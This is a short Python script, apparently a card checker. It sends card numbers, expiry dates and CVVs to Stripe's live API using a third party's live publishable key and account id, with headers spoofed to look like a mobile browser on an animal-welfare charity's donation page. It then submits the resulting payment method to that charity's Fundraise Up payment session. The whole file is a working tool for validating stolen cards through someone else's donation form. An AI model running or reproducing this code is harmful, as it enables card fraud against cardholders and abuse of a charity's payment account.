import requests


def verificar_stripe(numero, mes, ano, cvv):
    headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "es-CL,es-419;q=0.9,es;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
        ),
    }

    data = (
        f"type=card&card[number]={numero}&card[cvc]={cvv}"
        f"&card[exp_month]={mes}&card[exp_year]={ano}"
        "&guid=0a144a1a-732d-4329-977e-58574ce0644ab29d8e"
        "&muid=c5e3fee0-edbb-4a6d-8c82-5747061220a7b246d7"
        "&sid=65480593-fa7f-44c9-a0f5-638157835789436ece"
        "&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+split-card-element"
        "&referrer=https%3A%2F%2Fycspca.org"
        "&time_on_page=102109"
        "&key=pk_live_9RzCojmneCvL31GhYTknluXp"
        "&_stripe_account=acct_1FYyyOKsW8pKyVU0"
        "&_stripe_version=2025-02-24.acacia"
    )

    response = requests.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers,
        data=data,
    )

    # print(response.text)
    id = response.json()["id"]
    print(id)

    h2 = {
        "authority": "api.fundraiseup.com",
        "accept": "*/*",
        "accept-language": "es-CL,es-419;q=0.9,es;q=0.8",
        "content-type": "text/plain; charset=utf-8",
        "origin": "https://ycspca.org",
        "referer": "https://ycspca.org/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
        ),
    }

    Null = "null"
    d1 = {
        "paymentMethod": {
            "id": id,
            "object": "payment_method",
            "allow_redisplay": "unspecified",
            "billing_details": {
                "address": {
                    "city": Null,
                    "country": Null,
                    "line1": Null,
                    "line2": Null,
                    "postal_code": Null,
                    "state": Null,
                },
                "email": Null,
                "name": Null,
                "phone": Null,
                "tax_id": Null,
            },
            "card": {
                "brand": "mastercard",
                "brand_product": Null,
                "checks": {
                    "address_line1_check": Null,
                    "address_postal_code_check": Null,
                    "cvc_check": Null,
                },
                "country": "MX",
                "display_brand": "mastercard",
                "exp_month": 6,
                "exp_year": 2030,
                "funding": "credit",
                "generated_from": Null,
                "last4": "7550",
                "networks": {
                    "available": ["mastercard"],
                    "preferred": Null,
                },
                "regulated_status": "unregulated",
                "three_d_secure_usage": {
                    "supported": True
                },
                "wallet": Null,
            },
            "created": 1749426048,
            "customer": Null,
            "livemode": True,
            "radar_options": {},
            "type": "card",
        }
    }

    r2 = requests.post(
        "https://api.fundraiseup.com/paymentSession/3093935748576308463/pay",
        headers=h2,
        json=d1,
    )
    print(r2.text)
